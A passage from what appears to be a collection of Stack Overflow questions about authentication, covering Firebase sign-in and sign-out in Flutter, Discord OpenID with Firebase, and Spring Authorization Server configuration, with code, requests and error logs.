            child: SignInScreen(),
          );
        } else {
          return ElevatedButton(
            onPressed: () {
              signout();
            },
            child: const Text(&quot;Sign out&quot;),
          );
        }
      },
    );
  }
}
</code></pre>
<p>If I hot reload the app after signing out, sign in works fine. Sp it seems to me that something is not cleaned up or disconnected properly which prevents signing in after signing out, however all the examples I can see do not seem to do much in the way of clean up either...</p>
"
"<p>Been looking for a way to connect Discord Auth with Open ID
I have done all the steps according to the Firebase Open ID documentated found:
<a href=""https://firebase.google.com/docs/auth/web/openid-connect?hl=en&amp;authuser=0"" rel=""nofollow noreferrer"">https://firebase.google.com/docs/auth/web/openid-connect?hl=en&amp;authuser=0</a></p>
<p>I have found a similar Auth provider using OpenID to connect to Discord and they have a custom Issuer config as Discord does not provide a <code>.well-known/openid-configuration</code> per firebase documentation</p>
<p>Source: <a href=""https://fusionauth.io/docs/lifecycle/authenticate-users/identity-providers/gaming/discord"" rel=""nofollow noreferrer"">https://fusionauth.io/docs/lifecycle/authenticate-users/identity-providers/gaming/discord</a></p>
<p>The setup with Firebase OpenID is:</p>
<blockquote>
<p>Code Flow</p>
<p>Discord</p>
<p>Client ID from Discord App</p>
<p>Issuer (URL): <a href=""https://cdn.myproject.cloudflare.com/discord/"" rel=""nofollow noreferrer"">https://cdn.myproject.cloudflare.com/discord/</a>  *see below</p>
<p>Client ID from Discord App</p>
</blockquote>
<p>In Discord Dev portal under OAuth2
The redirects has</p>
<blockquote>
<p><a href=""https://myproject.firebaseapp.com/__/auth/handler"" rel=""nofollow noreferrer"">https://myproject.firebaseapp.com/__/auth/handler</a></p>
</blockquote>
<p>*Issuer URL</p>
<p><a href=""https://cdn.myproject.cloudflare.com/discord/"" rel=""nofollow noreferrer"">https://cdn.myproject.cloudflare.com/discord/</a></p>
<p>points to public json data file named &quot;openid-configuration&quot; in a directory called &quot;.well-known&quot;</p>
<p>contents of issuer URL/.well-known/openid-configuration:</p>
<pre class=""lang-js prettyprint-override""><code>{
    &quot;issuer&quot;: &quot;https://discord.com&quot;,
    &quot;authorization_endpoint&quot;: &quot;https://discord.com/api/oauth2/authorize&quot;,
    &quot;token_endpoint&quot;: &quot;https://discord.com/api/oauth2/token&quot;,
    &quot;userinfo_endpoint&quot;: &quot;https://discord.com/api/users/@me&quot;,
    &quot;scopes_supported&quot;: [
        &quot;openid&quot;,
        &quot;email&quot;,
        &quot;profile&quot;
    ]
}
</code></pre>
<p>this is enabled from my app with my other auth providers.
Do I need to use a URL Generator for the Issuer URL or something else?</p>
<p>The simple fact is that Firebase does not allow custom Issuer URL overrides.</p>
<p>processing the auth request with both redirect and popup:</p>
<pre class=""lang-js prettyprint-override""><code>var provider = new firebase.auth.OAuthProvider('oidc.discord');
//firebase.auth().signInWithRedirect(provider)
firebase.auth().signInWithPopup(provider)
    .then((result) =&gt; {
        // IdP data available in result.additionalUserInfo.profile.
        var credential = result.credential;
        var accessToken = credential.accessToken;
        var idToken = credential.idToken;
    })
    .catch(console.log);
</code></pre>
<p>Error</p>
<pre class=""lang-js prettyprint-override""><code>FirebaseError: Firebase: The supplied auth credential is incorrect, malformed or has expired. (auth/invalid-credential).
</code></pre>
<p>Alternative per suggested answers:
is to use OAuth2 within the browser by creating a custom Discord sign in link with <code>response_type=token</code> rather than <code>response_type=code</code>
which yields a url with a hash as follows:</p>
<pre class=""lang-js prettyprint-override""><code>https://mycustomdomain.com/auth/redirect.html#token_type=Bearer&amp;access_token=ty7QhLHdGNXnnHcnnR0eNIhALOf1w&amp;expires_in=604800&amp;scope=email
</code></pre>
<p>however this is only a decoded user profile and using:</p>
<pre class=""lang-json prettyprint-override""><code>URLSearchParams(window.location.hash.slice(1)); const [accessToken, tokenType] = [fragment.get('access_token'), fragment.get('token_type')];
</code></pre>
<p>to process the data does not provide a valid custom token for Firebase Auth as this data is from Discord OAuth not from Firebase Auth Handler with OpenID</p>
<pre class=""lang-js prettyprint-override""><code>firebase.auth().signInWithCustomToken(access_token)
    .then((userCredential) =&gt; {
        var user = userCredential.user;
        console.log('User', user)
    })
    .catch(console.log);
</code></pre>
<p>Error:</p>
<pre class=""lang-js prettyprint-override""><code>FirebaseError: Firebase: An internal AuthError has occurred. (auth/internal-error).
</code></pre>
"
"<p>I get this error:</p>
<blockquote>
<p>[2024-02-11T11:05:28.743Z]  @firebase/firestore: Firestore (10.7.2): FIRESTORE (10.7.2) INTERNAL ASSERTION FAILED: Unexpected state while writing to firestore.</p>
</blockquote>
<p>How do i fix it?</p>
<p>Here is my code for the signup onPress handler. Note that resetForm and setSubmitting are functions from yup library used for form validation.</p>
<pre><code>const { SignUpAuth } = useContext(AuthContext)

const handleSignUp = async (values, {resetForm, setSubmitting}) =&gt; {
  delete values.confirmPassword
  console.log(&quot;values: &quot;, values)
  
  try {
      setSubmitting()
      const onSuccess = await SignUpAuth(values)
      onSuccess &amp;&amp; resetForm()
  } catch (error) {
    console.error('Error signing up:', error.message);
  }
};
</code></pre>
<p>AuthContext</p>
<pre><code>export const AuthProvider = ({children}) =&gt; { 
  const [onSuccess, setOnSuccess] = useState(false)

  const SignUpAuth = async (user) =&gt; {
      
      try {
          const userCredential = await createUserWithEmailAndPassword(auth, user.email, user.password);
          const uid = userCredential.user.uid;
          const newUser = await setDoc(doc(collection(db, &quot;Community&quot;), uid), {
              username: user.username,
              email: user.email,
              FirstName: '',
              LastName: '',
              walletBalance: 0,
              startTimer: 0,
              endTimer: 0,
              RegDate: new Date(),
              invitee: user.referrer,
              KYC: false,
              position: 0
          } )
          setOnSuccess(true)
          console.log(`user signed up ${newUser.username} successfully`)
          return true
      } catch (error) {
          console.error(error)
          return false
      } 
  }

  // const SignInAuth = async =&gt; {
      
  // }
  return(
  &lt;AuthContext.Provider value={{SignUpAuth, isLogedIn, onSuccess }}&gt;
      {children}
  &lt;/AuthContext.Provider&gt;
  )
}
</code></pre>
<p>I tried changing my firestore rule from this</p>
<pre><code>service cloud.firestore {
  match /databases/{database}/documents {
    match /{document=**} {
      allow read, write: if request.time &lt; timestamp.date(2024, 2, 24);
    }
  }
}
</code></pre>
<p>to this</p>
<pre><code>service cloud.firestore {
  match /databases/{database}/documents {
    match /{document=**} {
      allow read, write: if request.auth != null;
    }
  }
}
</code></pre>
<p>but it still gave same error
createUserWithEmailAndPassword works fine but i can't add the fields to the firestore.
Also, in firestore console, the community collection is exists but the document doesn't, so i am using setDoc to create it if it doesn't</p>
"
"<p>I'm encountering an unexpected issue in my Flutter application where, upon initiating the OTP verification process for phone authentication using Firebase, the app redirects to my SIH project website for verification, displays a &quot;Verifying not a robot&quot; message, and then redirects back to the OTP screen in my app.</p>
<pre><code>import 'package:firebase_auth/firebase_auth.dart';
import 'package:get/get.dart';


class AuthenticationRepository extends GetxController
{
  static AuthenticationRepository get instance =&gt; Get.find();
  final _auth = FirebaseAuth.instance;
  late final Rx&lt;User?&gt; firebaseUser;
  var verificationId = ' '.obs;

  @override
  void onReady()
  {
    firebaseUser = _auth.currentUser as Rx&lt;User?&gt;;
    firebaseUser.bindStream(_auth.userChanges());
    ever(firebaseUser, _setInitialScreen);
  }

  _setInitialScreen(User? user)
  {
    //user == null ? Get.offAll(() =&gt; const WelcomeScreen()) : Get.offAll(() =&gt; const Dashboard());
  }

  Future&lt;void&gt; phoneAuthentication(String phoneNo) async {
    await _auth.verifyPhoneNumber(
        phoneNumber: phoneNo,
        verificationCompleted: (credentials) async{
          await _auth.signInWithCredential(credentials);
        },
        verificationFailed: (e){
          if (e.code == 'invalid-phone-number'){
            Get.snackbar('Error', 'The provided phone number is not valid');
          }
          else{
            Get.snackbar('Error', 'Something went wrong try again !');
          }
        },
        codeSent: (verificationId, resendToken){
          this.verificationId.value = verificationId;
        },
        codeAutoRetrievalTimeout: (verificationId){
          this.verificationId.value = verificationId;
        }
    );
  }

  Future&lt;bool&gt; verifyOTP(String otp) async{
    var credentials = await _auth.signInWithCredential(PhoneAuthProvider.credential(verificationId: this.verificationId.value, smsCode: otp));
    return credentials.user != null ? true : false;
  }


}
</code></pre>
<p>The above is my code and expected result would have been</p>
<p>The app should handle the OTP verification process internally without any redirection to external websites.</p>
<p>Things I've tried:</p>
<p>Checked Firebase project settings for any unintended redirect URLs.
Reviewed the code for any unintended navigation actions.
Tested the app on different devices to rule out device-specific issues.</p>
"
"<p>It's my first time trying to build a role based access control, but I'm facing some problems and would appreciate any kind of help.
I've got a User who's authentication is handled through MSAL in the frontend.
However the roles of a user should be (due to safety reasons) stored only in a database. Is there any kind of way I can load the user from my database and get him into the security context?</p>
<p>I've already looked in some tutorials but they all use the WebSecurityConfigurerAdapter that is no longer in use (as far as I know) and I also created a CustomUserDetailsSerive to load the User from my database, so I just need to find a way to load the User into a Security Context.
In addition what kind of spring security filter chain would you recommend to use in my case?</p>
"
"<p>I tried setting up a very minimal Spring Authorization Server example as part of evaluating it for use in one of my projects. The Authorization Server will be used with a SPA application so the Authorization Code flow with PKCE will be used. I am using Spring Boot 3.2.0.</p>
<p>The example application is generated by <a href=""https://start.spring.io/"" rel=""nofollow noreferrer"">Spring Initializr</a> and consists of a single configuration file to set up the minimal requirements for an Authorization server that largely follows the <a href=""https://docs.spring.io/spring-authorization-server/reference/guides/how-to-pkce.html"" rel=""nofollow noreferrer"">&quot;How-To&quot; from the official docs</a></p>
<pre><code>@SpringBootApplication
@EnableWebSecurity
public class DemoApplication
{
    public static void main(String[] args) {
        SpringApplication.run(DemoApplication.class, args);
    }

    @Bean
    public UserDetailsService users() {
        UserDetails user = User.withDefaultPasswordEncoder()
                .username(&quot;admin&quot;)
                .password(&quot;admin&quot;)
                .roles(&quot;ADMIN&quot;)
                .build();
        return new InMemoryUserDetailsManager(user);
    }

    @Bean
    @Order(1)
    public SecurityFilterChain authorizationServerSecurityFilterChain(HttpSecurity http) throws Exception {
        OAuth2AuthorizationServerConfiguration.applyDefaultSecurity(http);

        http
                // Redirect to the login page when not authenticated from the
                // authorization endpoint
                .exceptionHandling((exceptions) -&gt; exceptions
                        .defaultAuthenticationEntryPointFor(
                                new LoginUrlAuthenticationEntryPoint(&quot;/login&quot;),
                                new MediaTypeRequestMatcher(MediaType.TEXT_HTML)
                        )
                );

        return http.cors(Customizer.withDefaults()).build();
    }

    @Bean
    @Order(2)
    public SecurityFilterChain defaultSecurityFilterChain(HttpSecurity httpSecurity) throws Exception
    {
        return httpSecurity
                .authorizeHttpRequests((authorize) -&gt; authorize
                        .requestMatchers(&quot;/admin/**&quot;).hasRole(&quot;ADMIN&quot;)
                        .requestMatchers(&quot;/&quot;, &quot;/**&quot;).permitAll()
                )
                .cors(Customizer.withDefaults())
                .formLogin(Customizer.withDefaults())
                .build();
    }

    @Bean
    public RegisteredClientRepository registeredClientRepository() {
        RegisteredClient publicClient = RegisteredClient.withId(UUID.randomUUID().toString())
                .clientId(&quot;public-client&quot;)
                .clientAuthenticationMethod(ClientAuthenticationMethod.NONE)
                .authorizationGrantType(AuthorizationGrantType.AUTHORIZATION_CODE)
                .redirectUri(&quot;http://127.0.0.1:4200&quot;)
                .clientSettings(ClientSettings.builder()
                        .requireAuthorizationConsent(true)
                        .requireProofKey(true)
                        .build()
                )
                .build();

        return new InMemoryRegisteredClientRepository(publicClient);
    }

    @Bean
    CorsConfigurationSource corsConfigurationSource()
    {
        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        CorsConfiguration config = new CorsConfiguration();
        config.addAllowedHeader(&quot;*&quot;);
        config.addAllowedMethod(&quot;*&quot;);
        config.addAllowedOrigin(&quot;http://127.0.0.1:4200&quot;);
        config.setAllowCredentials(true);
        source.registerCorsConfiguration(&quot;/**&quot;, config);
        return source;
    }
}
</code></pre>
<p>When making a properly formed request to the <code>/authorize</code> endpoint I am redirected to the default login page as expected.
<a href=""https://i.stack.imgur.com/6pVi4.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/6pVi4.png"" alt=""Spring Authorization Server default log in page"" /></a></p>
<p>For the sake of completeness the example request that redirects me to this login page looks like <code>http://127.0.0.1:8080/oauth2/authorize?response_type=code&amp;client_id=public-client&amp;redirect_uri=http%3A%2F%2Flocalhost%3A4200&amp;state=1234xyz&amp;code_challenge=cFeDr-CjSa6l1C3w388Qoz1GpM3Pa0qzkOF9rq0Wp8A&amp;code_challenge_method=S256</code> using a code challenge and verifier generated by <a href=""https://example-app.com/pkce"" rel=""nofollow noreferrer"">PKCE Tools</a></p>
<p>When entering valid user credentials (as configured in the configuration above) I am redirected to the consent screen as expected.
<a href=""https://i.stack.imgur.com/sg51d.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/sg51d.png"" alt=""Spring Authorization Server consent screen"" /></a></p>
<p>However, upon granting consent by selecting the &quot;Submit Consent&quot; button I get an &quot;access_denied&quot; error returned in the redirect url. The url that gets redirected to is
<code>http://127.0.0.1:4200/?error=access_denied&amp;error_description=OAuth%202.0%20Parameter%3A%20client_id&amp;error_uri=https%3A%2F%2Fdatatracker.ietf.org%2Fdoc%2Fhtml%2Frfc6749%23section-4.1.2.1&amp;state=1234xyz</code></p>
<p>This includes the error message &quot;access_denied&quot; and error description &quot;OAuth 2.0 Parameter: client_id&quot; and points me to <a href=""https://datatracker.ietf.org/doc/html/rfc6749#section-4.1.2.1"" rel=""nofollow noreferrer"">a section of the RFC</a> which does not contain any further useful information for troubleshooting this specific error message.</p>
<p>Ostensibly, the error description indicates that Spring thinks there is something wrong with the client_id but I fail to see what could be wrong with it.</p>
<p>Which piece of the puzzle am I missing here that is causing me to receive this error for a valid user who has successfully authenticated and chosen to give their consent?</p>
<p><strong>EDIT 2024-02-19</strong></p>
<p>I noticed when revisiting this that my request to the authorization server was using <code>127.0.0.1</code> while my redirect was using <code>localhost</code>. I have since corrected this so that both the request and redirect use the same exact host and have tested it by trying out both hosts of <code>127.0.0.1</code> and <code>localhost</code>. However, the results when using either host in a consistent manner were the same as described in the original question and I am still receiving the &quot;access_denied&quot; error.</p>
<p>The question has been updated to show the use of <code>127.0.0.1</code>.</p>
"
"<p>When sending the following request, the request is successfully finished but the login screen is still skipped. The user doesn't need to login again.</p>
<pre><code>curl --location 'http://localhost:8080/connect/logout' \
--header 'Content-Type: application/x-www-form-urlencoded' \
--data-urlencode 'id_token_hint={id_token_hint}' \
--data-urlencode 'post_logout_redirect_uri=https://example.com'
</code></pre>
<p>Only when sending request with the Cookie, the login screen is presented again.</p>
<pre><code>curl --location 'http://localhost:8080/connect/logout' \
--header 'Content-Type: application/x-www-form-urlencoded' \
--data-urlencode 'id_token_hint={id_token_hint}' \
--data-urlencode 'post_logout_redirect_uri=https://example.com'
-H &quot;Cookie: JSESSIONID={sessionId}&quot;
</code></pre>
<p>Could the session be invalidated based on <code>id_token_hint</code> and not the Cookie value?</p>
<p>I found in the class <code>OidcLogoutEndpointFilter</code>, the logout is performed based on the provided Cookie, so if cookie is not found, the session cannot be invalidated.</p>
"
"<p>I was following <a href=""https://github.com/spring-projects/spring-authorization-server/tree/main/samples"" rel=""nofollow noreferrer"">this Demo example</a> and was wondering why the Auth server config reads</p>
<pre><code>          redirect-uris:
            - &quot;http://127.0.0.1:1234/login/oauth2/code/my-webapp-client-oidc&quot;
            - &quot;http://127.0.0.1:1234/authorized&quot;
          post-logout-redirect-uris:
            - &quot;http://127.0.0.1:1234/logged-out&quot;
</code></pre>
<p>instead of</p>
<pre><code>          redirect-uris:
            - &quot;http://localhost:1234/login/oauth2/code/my-webapp-client-oidc&quot;
            - &quot;http://localhost:1234/authorized&quot;
          post-logout-redirect-uris:
            - &quot;http://localhost:1234/logged-out&quot;
</code></pre>
<p>I would assume that it makes no difference but it does. When changing the URIs to localhost, the auth server gives me an exception when trying to login:</p>
<pre><code>org.springframework.security.access.AccessDeniedException: Access Denied
    at org.springframework.security.web.access.intercept.AuthorizationFilter.doFilter(AuthorizationFilter.java:98) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:126) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:120) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:100) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:179) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374) ~[spring-security-web-6.2.1.jar:6.2.1]
    at...
</code></pre>
<p>Could you please explain that to me? Thank you.</p>
"
"<p>I am using spring authorization server with feign for my microservices. Service A has an endpoint that exposes an unprotected resource, but this resource makes a Http call to Service B (protected resource) using feign so there's no user token to be passed to Service B. What approach should I take when system is trying to perform service to service calls, should I use client credentials grant type?</p>
<p>I tried using <code>spring.cloud.openfeign.oauth2.enabled=true</code> from docs but it doesn't work. I still get 401 status code.</p>
"
"<p>I have a application in which I manage two types of your. I store both user data in different collection, so want to navigate screen based on user type. That's why I want to collection name from Firebase Firestore, so that based on the user type I show different  screen.</p>
<p><a href=""https://i.stack.imgur.com/CA9lS.png"" rel=""nofollow noreferrer"">main. dart file</a>
above is code of my main .dart file in which i use stream builder to identify user base on there data
<a href=""https://i.stack.imgur.com/I8bN3.png"" rel=""nofollow noreferrer"">if condition where i identify snap shot has data</a></p>
<p>this is condition  where I identify  snapshot .has Data or Not if snapshot have data then it move to Tabs Screen() but I want to the identify the data base on user type &amp; then show them different screen base on there user type . Please Help!</p>
"
"<p>I'm using Spring Authorization Server, and didn't notice that <code>http.server.requests</code> metric contains <code>/oauth2/token</code> <code>uri</code> tag.</p>
<p>But I've noticed during debugging of <code>WebMvcMetricsFilter</code> that the metric is actually counted, but the <code>uri</code> tag is <code>root</code>, because <code>HttpServletRequest#getPathInfo</code> returns <code>null</code> for requests on <code>/oauth2/token</code></p>
<p>Why doesn't that work by defualt?</p>
<p>Also didn't notice anything about metrics in docs <a href=""https://docs.spring.io/spring-authorization-server/reference/overview.html"" rel=""nofollow noreferrer"">https://docs.spring.io/spring-authorization-server/reference/overview.html</a></p>
<p>Any idea how to fix <code>uri</code> tag for <code>http.server.requests</code> metric for standard <code>/oauth2/token</code> endpoint?</p>
"
"<p>I implemented a custom revocation authentication provider and added it to the <code>OAuth2AuthorizationServerConfigurer</code>, and it works fine. then we decided to add the revoke token endpoint to the <code>permitAll()</code> endpoints and remove the security check because we want to use it without sending clientId and clientSecret, then when I am throwing an exception from the custom revocation authentication provider, the default one get excuted and then the authentication check in the default one throws <code>OAuth2AuthenticationException(OAuth2ErrorCodes.INVALID_CLIENT)</code>.
Even if I throw OAuth2AuthenticationException(OAuth2ErrorCodes.INVALID_TOKEN) from my custom revocation authentication provider.</p>
<p>This is my code:</p>
<pre><code> authorizationServerConfigurer.tokenRevocationEndpoint(tokenRevocationEndpoint -&gt; tokenRevocationEndpoint.authenticationProvider(new RevocationAuthenticationProvider(revokedTokenRepository)));
</code></pre>
<pre><code>public class RevocationAuthenticationProvider implements AuthenticationProvider {

@Override
    public Authentication authenticate(Authentication authentication) throws AuthenticationException {
        OAuth2TokenRevocationAuthenticationToken tokenRevocationAuthentication =
                (OAuth2TokenRevocationAuthenticationToken) authentication;

        JWTClaimsSet claims;
        try {
            claims = getTokenClaims(tokenRevocationAuthentication);
            if (isCustomValidationCheck(claims)) {
                throw new OAuth2AuthenticationException(OAuth2ErrorCodes.INVALID_TOKEN);
            }
// Custom implementation
}
}
</code></pre>
<p>if the <code>isCustomValidationCheck</code> method return true I am getting a response message &quot;invalid_client&quot; not invalid_token because the default logic is always checking for the <code>clientPrincipal</code> in the <code>OAuth2AuthenticationProviderUtils.getAuthenticatedClientElseThrowInvalidClient()</code></p>
"
"<p>Using the latest Spring Authorization Server, how would one go about creating a user registration flow? After creating a controller endpoint for registration along with the corresponding .html page, what would be the proper next steps for saving the user and generating a token?</p>
<p>To expand on the use case</p>
<ol>
<li>User click Signup link from client app</li>
<li>Auth server registration page is displayed</li>
<li>On submit, user is created in Auth server, jwt created with a ROLE_SIGNUP role.</li>
<li>Auth server redirects back to client app where user completes the registration process.</li>
</ol>
<p>I've looked all over in various github repos and elsewhere trying to find some sort of hints without luck, hoping for some sort of direction.</p>
"
"<p>when I made a simple authorization server with <code>org.springframework.security:spring-security-oauth2-authorization-server:1.2.2</code> library.</p>
<p>I found a document on <a href=""https://docs.spring.io/spring-authorization-server/reference"" rel=""nofollow noreferrer"">https://docs.spring.io/spring-authorization-server/reference</a></p>
<p>And I tried to do like this document....</p>
<pre class=""lang-java prettyprint-override""><code>@Configuration
@EnableWebSecurity
public class SecurityConfiguration {


    @Bean
    public SecurityFilterChain securityFilterChain( HttpSecurity http ) throws Exception {
        http
                .authorizeHttpRequests( ( authorize ) -&gt; authorize
                        .requestMatchers( &quot;/oauth2/**&quot; ).authenticated()
                        .anyRequest().permitAll()
                )
                .httpBasic( Customizer.withDefaults() )
                .formLogin( Customizer.withDefaults() )
                .cors( httpSecurityCorsConfigurer -&gt; httpSecurityCorsConfigurer.disable())
                .csrf( httpSecurityCsrfConfigurer -&gt; httpSecurityCsrfConfigurer.disable());


        return http.build();
    }

    @Bean
    public AuthorizationServerSettings authorizationServerSettings(  ){

        return AuthorizationServerSettings.builder()
                .issuer( &quot;http://localhost:8000&quot; )
                .tokenEndpoint( &quot;/oauth2/v1/token&quot; )
                .tokenIntrospectionEndpoint( &quot;/oauth2/v1/verify&quot; )
                .build();
    }

    @Bean
    public OAuth2AuthorizationService authorizationService(){
        return new InMemoryOAuth2AuthorizationService();
    }

    @Bean
    public RegisteredClientRepository registeredClientRepository(){

        RegisteredClient client = RegisteredClient.withId( UUID.randomUUID().toString() )
                .clientId( &quot;user&quot; )
                .clientSecret( &quot;{noop}user&quot; )
                .clientAuthenticationMethod( ClientAuthenticationMethod.CLIENT_SECRET_BASIC )
                .authorizationGrantType( AuthorizationGrantType.AUTHORIZATION_CODE )
                .authorizationGrantType( AuthorizationGrantType.CLIENT_CREDENTIALS )
                .authorizationGrantType( AuthorizationGrantType.REFRESH_TOKEN )
                .redirectUri( &quot;http://localhost:8000/redirect&quot; )
                .tokenSettings( TokenSettings.builder().accessTokenTimeToLive( Duration.ofDays( 1 ) ).build() )
                .clientSettings( ClientSettings.builder()
                        .build() )
                .build();


        return new InMemoryRegisteredClientRepository( client );
    }

    @Bean
    public SecurityFilterChain authorizationServerSecurityFilterChain(HttpSecurity http) throws Exception {

        OAuth2AuthorizationServerConfigurer authorizationServerConfigurer =
                new OAuth2AuthorizationServerConfigurer();

        http.apply( authorizationServerConfigurer );

        authorizationServerConfigurer
                .tokenEndpoint( Customizer.withDefaults() )
                .tokenGenerator( new OAuth2AccessTokenGenerator() )
                .authorizationServerSettings( authorizationServerSettings( ) )
                .registeredClientRepository( registeredClientRepository() )
                .authorizationService( authorizationService() );
//              .setBuilder( http );


        return http.build();
    }

}
</code></pre>
<p>Here is my configuration code.</p>
<p>And I checked basic token authentication was applied.</p>
<p>but when i called token endpoint url (&quot;http://localhost:8000/oauth2/v1/token) with grant_type = client_credentials, the server return 404 error.</p>
<p>I couldn't find why they return 404 error.</p>
<p>please let me know how to set token url.</p>
<p>here is my debug log.</p>
<pre><code>2024-02-27T16:07:12.942+09:00 DEBUG 84973 --- [nio-8000-exec-8] o.s.security.web.FilterChainProxy        : Securing POST /oauth2/v1/token
2024-02-27T16:07:13.147+09:00 DEBUG 84973 --- [nio-8000-exec-8] o.s.s.a.dao.DaoAuthenticationProvider    : Authenticated user
2024-02-27T16:07:13.148+09:00 DEBUG 84973 --- [nio-8000-exec-8] o.s.s.w.a.www.BasicAuthenticationFilter  : Set SecurityContextHolder to UsernamePasswordAuthenticationToken [Principal=org.springframework.security.core.userdetails.User [Username=user, Password=[PROTECTED], Enabled=true, AccountNonExpired=true, CredentialsNonExpired=true, AccountNonLocked=true, Granted Authorities=[]], Credentials=[PROTECTED], Authenticated=true, Details=WebAuthenticationDetails [RemoteIpAddress=0:0:0:0:0:0:0:1, SessionId=null], Granted Authorities=[]]
2024-02-27T16:07:13.150+09:00 DEBUG 84973 --- [nio-8000-exec-8] o.s.security.web.FilterChainProxy        : Secured POST /oauth2/v1/token
2024-02-27T16:07:13.161+09:00 DEBUG 84973 --- [nio-8000-exec-8] o.s.security.web.FilterChainProxy        : Securing POST /error
2024-02-27T16:07:13.161+09:00 DEBUG 84973 --- [nio-8000-exec-8] o.s.security.web.FilterChainProxy        : Secured POST /error

</code></pre>
"
"<p>I have already created a proxy plugin path for chrome driver options with classic manifestjson and background is string and calling callbackFn for authCreds now the proxy getting passed here is of basic/ntlm auth I want to now use the ntlm2 or Kerberos auth for the proxy creds and accessing the web-pages does anyone has any exp with this on how to get the ntlm2 or Kerberos auth while using the selenium chrome driver extension?</p>
<p>I tried the Kerberos auth via auth-negotiate-delegate-allowlist and auth-server-allowlist and passed allowed domain list didn’t helped</p>
"
"<p>First of all, here is an answer I referred to, which worked once, but now keeps giving this <code>SSLHandshakeException (CertPathValidatorException)</code> after that day, under the same network.</p>
<p><a href=""https://stackoverflow.com/a/71542188/3261923"">SSL example</a></p>
<p>In addition, I'm using Proxyman with Pixel 6a API 33 emulator, which allows me to use <code>localhost</code>.</p>
<p>Please let me know if there is anything that I potentially missed.</p>
"
"<p>i have setup a flutter app with firebase auth, the whole authentication process is good(sign in, sign up and sign out), however when i created multiple screens and navigated using Navigator.pushReplacement, the app only signs out if i attempt without navigating to any other screens, when i attempt after navigating the signout stops working.</p>
<p>i have tried pushReplacemnt and pop as well, it either navigates to login screen without signing out or signs out without going to login screen. i want to be able to sign out successfully then redirected to login screen and be able to login again.</p>
<pre><code>import 'package:firebase_auth/firebase_auth.dart';
import 'package:flutter/material.dart';
import 'package:vijayadwaja/pages/loginpage.dart';

import 'profile.dart';
import 'bulkorders.dart';
import 'family.dart';
import 'subscription.dart';
import 'orders.dart';
import 'settings.dart';

class MyDrawer extends StatelessWidget {
  const MyDrawer({
    super.key,
  });

  @override
  Widget build(BuildContext context) {
    return Drawer(
      backgroundColor: Color.fromRGBO(207, 22, 22, 1),
      child: Container(
        color: Colors.white,
        child: Column(
          children: [
            Container(
              decoration: const BoxDecoration(
                color: Color.fromRGBO(207, 22, 22, 1),
                // borderRadius:
                //     BorderRadius.only(bottomRight: Radius.circular(30)),
              ),
              child: Padding(
                padding: const EdgeInsets.only(top: 60.0, bottom: 25.0),
                child: ListTile(
                  leading: CircleAvatar(
                    backgroundColor: Colors.grey[300],
                    child: const Icon(
                      Icons.person_2_rounded,
                      color: Color.fromRGBO(207, 22, 22, 1),
                    ),
                  ),
                  title: const Text(
                    'John Doe',
                    style: TextStyle(
                        fontWeight: FontWeight.w600, color: Colors.white),
                  ),
                  subtitle: const Text(
                    '+91 12345 67890',
                    style: TextStyle(color: Colors.white70),
                  ),
                  onTap: () {
                    Navigator.pushReplacement(
                      context,
                      MaterialPageRoute(
                        builder: (context) {
                          return UserProfile();
                        },
                      ),
                    );
                  },
                ),
              ),
            ),
            Column(
              children: [
                const Divider(
                  color: Colors.white,
                ),
                ListTile(
                  leading: const Icon(Icons.subscriptions_rounded),
                  title: const Text('Subscription'),
                  onTap: () {
                    Navigator.pushReplacement(
                      context,
                      MaterialPageRoute(
                        builder: (context) {
                          return const Subscription();
                        },
                      ),
                    );
                  },
                ),
                ListTile(
                  leading: const Icon(Icons.inventory_2_rounded),
                  title: const Text('My Orders'),
                  onTap: () {
                    Navigator.pushReplacement(
                      context,
                      MaterialPageRoute(
                        builder: (context) {
                          return const MyOrders();
                        },
                      ),
                    );
                  },
                ),
                ListTile(
                  leading: const Icon(Icons.local_shipping),
                  title: const Text('Bulk Orders'),
                  onTap: () {
                    Navigator.pushReplacement(
                      context,
                      MaterialPageRoute(
                        builder: (context) {
                          return const BulkOrders();
                        },
                      ),
                    );
                  },
                ),
                ListTile(
                  leading: const Icon(Icons.family_restroom),
                  title: const Text('My Family'),
                  onTap: () {
                    Navigator.pushReplacement(
                      context,
                      MaterialPageRoute(
                        builder: (context) {
                          return const MyFamily();
                        },
                      ),
                    );
                  },
                ),
                const Divider(color: Colors.black38),
                ListTile(
                  leading: const Icon(Icons.notifications),
                  title: const Text('Notifications'),
                  onTap: () {
                    Navigator.pushReplacement(
                      context,
                      MaterialPageRoute(
                        builder: (context) {
                          return const Settings();
                        },
                      ),
                    );
                  },
                ),
                ListTile(
                  leading: const Icon(Icons.settings),
                  title: const Text('Settings'),
                  onTap: () {
                    Navigator.pushReplacement(
                      context,
                      MaterialPageRoute(
                        builder: (context) {
                          return const Settings();
                        },
                      ),
                    );
                  },
                ),
                const Divider(color: Colors.black38),
                ListTile(
                  leading: const Icon(Icons.logout),
                  title: const Text('Log Out'),
                  onTap: () async {
                    try {
                      await FirebaseAuth.instance.signOut();
                      Navigator.pop;
                      // Navigator.pushReplacement(
                      //   context,
                      //   MaterialPageRoute(
                      //       builder: (context) =&gt;
                      //           const LoginPage()),
                      // );
                    } catch (e) {
                      print('Error signing out: $e');
                    }
                  },
                ),
              ],
            ),
          ],
        ),
      ),
    );
  }
}

